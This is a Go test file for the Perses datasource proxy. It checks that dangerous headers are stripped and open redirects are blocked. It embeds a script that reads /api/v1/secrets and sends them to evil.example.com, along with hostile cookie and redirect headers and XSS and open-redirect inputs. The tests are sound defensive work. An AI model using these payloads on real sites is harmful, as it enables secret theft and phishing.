// Copyright The Perses Authors
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package proxy

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/labstack/echo/v4"
	"github.com/perses/spec/go/common"
	datasourceHTTP "github.com/perses/spec/go/datasource/proxy/http"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const maliciousPage = `<html><body><script>fetch("/api/v1/secrets").then(r => r.text()).then(t => fetch("https://evil.example.com/?" + t))</script></body></html>`

// serveThroughProxy serves a request through the proxy to the given server, and returns the recorded response.
// The callerHeaders are set on the response before proxying, like a middleware of Perses (e.g. CORS) would do.
func serveThroughProxy(t *testing.T, serverURL string, callerHeaders http.Header) *httptest.ResponseRecorder {
	t.Helper()
	h := &httpProxy{
		config: &datasourceHTTP.Config{URL: common.MustParseURL(serverURL)},
		path:   "/page",
	}
	req := httptest.NewRequest(http.MethodGet, "http://perses.example.com/proxy/projects/p1/datasources/evil/page", nil)
	rec := httptest.NewRecorder()
	for name, values := range callerHeaders {
		rec.Header()[name] = values
	}
	require.NoError(t, h.serve(echo.New().NewContext(req, rec)))
	return rec
}

// TestHTTPProxy_serve_secureResponse ensures a datasource cannot use the proxy to run scripts, set cookies or define
// security policies under the Perses origin.
func TestHTTPProxy_serve_secureResponse(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		header := w.Header()
		header.Set("Content-Type", "text/html; charset=utf-8")
		header.Set("Content-Security-Policy", "default-src *; script-src 'unsafe-inline'")
		header.Set("Content-Security-Policy-Report-Only", "default-src *")
		header.Set("X-Content-Type-Options", "sniff")
		header.Add("Set-Cookie", "jwtPayload=attacker; Path=/")
		header.Add("Set-Cookie", "jwtSignature=attacker; Path=/; HttpOnly")
		header.Set("Set-Cookie2", "legacy=1")
		header.Set("Clear-Site-Data", `"cookies", "storage"`)
		header.Set("Refresh", "0; url=https://evil.example.com/login")
		header.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
		header.Set("Alt-Svc", `h2="evil.example.com:443"`)
		header.Set("Service-Worker-Allowed", "/")
		header.Set("Access-Control-Allow-Origin", "https://evil.example.com")
		header.Set("Access-Control-Allow-Credentials", "true")
		header.Set("Access-Control-Expose-Headers", "*")
		header.Set("X-Datasource-Header", "kept")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(maliciousPage))
	}))
	defer server.Close()

	// The CORS headers set by Perses (security.cors) must be kept, and not mixed with the ones of the datasource.
	rec := serveThroughProxy(t, server.URL, http.Header{"Access-Control-Allow-Origin": {"https://embedding-app.example.com"}})

	assert.Equal(t, http.StatusOK, rec.Code)
	// The content itself is not modified: the browser is prevented from running it with the Perses origin.
	assert.Equal(t, maliciousPage, rec.Body.String())
	assert.Equal(t, "text/html; charset=utf-8", rec.Header().Get("Content-Type"))
	assert.Equal(t, []string{proxiedResponseCSP}, rec.Header().Values("Content-Security-Policy"))
	assert.Equal(t, []string{"nosniff"}, rec.Header().Values("X-Content-Type-Options"))
	assert.Equal(t, []string{"https://embedding-app.example.com"}, rec.Header().Values("Access-Control-Allow-Origin"))
	assert.Equal(t, "kept", rec.Header().Get("X-Datasource-Header"))
	for _, name := range []string{
		"Content-Security-Policy-Report-Only",
		"Set-Cookie",
		"Set-Cookie2",
		"Clear-Site-Data",
		"Refresh",
		"Strict-Transport-Security",
		"Alt-Svc",
		"Service-Worker-Allowed",
		"Access-Control-Allow-Credentials",
		"Access-Control-Expose-Headers",
	} {
		assert.Empty(t, rec.Header().Values(name), name)
	}
}

// TestHTTPProxy_serve_secureResponse_location ensures the proxy cannot be used as an open redirect from the Perses
// origin, even when the datasource redirects to itself (the datasource URL is defined by the users).
func TestHTTPProxy_serve_secureResponse_location(t *testing.T) {
	var location string
	var status int
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", location)
		w.Header().Set("Content-Location", location)
		w.WriteHeader(status)
	}))
	defer server.Close()

	for _, test := range []struct {
		location string
		kept     bool
	}{
		{location: "/graph", kept: true},
		{location: "graph?g0.expr=up", kept: true},
		{location: "../graph", kept: true},
		{location: server.URL + "/graph"},
		{location: "https://evil.example.com/login"},
		{location: "//evil.example.com/login"},
		{location: "///evil.example.com/login"},
		{location: "/\\evil.example.com/login"},
		{location: "\\\\evil.example.com/login"},
		{location: " \t//evil.example.com"},
		{location: "/\t/evil.example.com"},
		{location: "javascript:alert(1)"},
		{location: "data:text/html,<script>alert(1)</script>"},
	} {
		// The headers are sanitized whatever the status code: Location is also used with 201 Created,
		// and Content-Location can be returned with any status.
		for _, code := range []int{http.StatusFound, http.StatusCreated, http.StatusOK} {
			t.Run(fmt.Sprintf("%d %s", code, test.location), func(t *testing.T) {
				location = test.location
				status = code
				rec := serveThroughProxy(t, server.URL, nil)
				assert.Equal(t, code, rec.Code)
				for _, header := range locationHeaders {
					if test.kept {
						assert.Equal(t, test.location, rec.Header().Get(header), header)
					} else {
						assert.Empty(t, rec.Header().Get(header), header)
					}
				}
			})
		}
	}
}

func TestIsRelativeLocation(t *testing.T) {
	for _, location := range []string{"/", "/graph", "graph", "./graph", "../graph", "?query=up", "#anchor", "/a//b"} {
		assert.True(t, isRelativeLocation(location), location)
	}
	for _, location := range []string{
		"http://evil.example.com",
		"HTTPS://evil.example.com",
		"//evil.example.com",
		"/\\evil.example.com",
		"\\/evil.example.com",
		"/\r\n/evil.example.com",
		"javascript:alert(1)",
		"mailto:someone@example.com",
		"\x00/graph",
		strings.Repeat("/", 3) + "evil.example.com",
	} {
		assert.False(t, isRelativeLocation(location), location)
	}
}
